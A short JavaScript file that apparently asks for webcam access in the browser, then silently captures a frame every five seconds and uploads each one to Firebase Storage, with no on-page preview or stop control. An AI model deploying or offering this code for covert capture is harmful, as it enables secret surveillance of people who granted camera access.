// Initialize Firebase with your project's config
var firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT_ID.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
  };
  
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  var storage = firebase.storage();
  
  function getPermissions() {
    // Request camera access
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        console.log("Camera access granted");
        capturePhoto(stream);
      })
      .catch((error) => {
        console.error("Camera error:", error);
      });
  }
  
  function capturePhoto(stream) {
    let video = document.createElement("video");
    video.srcObject = stream;
    video.play();
  
    setInterval(() => {
      let canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      let context = canvas.getContext("2d");
  
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
  
      let imageData = canvas.toDataURL("image/png");
      uploadPhoto(imageData);
    }, 5000); // Change the interval as needed
  }
  
  function uploadPhoto(imageData) {
    // Convert base64 image to blob
    const byteString = atob(imageData.split(',')[1]);
    const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab], { type: mimeString });
  
    // Upload blob to Firebase Storage
    const storageRef = storage.ref('photos/photo_' + Date.now() + '.png');
    storageRef.put(blob).then((snapshot) => {
      console.log('Uploaded a photo to Firebase!');
    }).catch(error => {
      console.error("Photo upload failed:", error);
    });
  }
  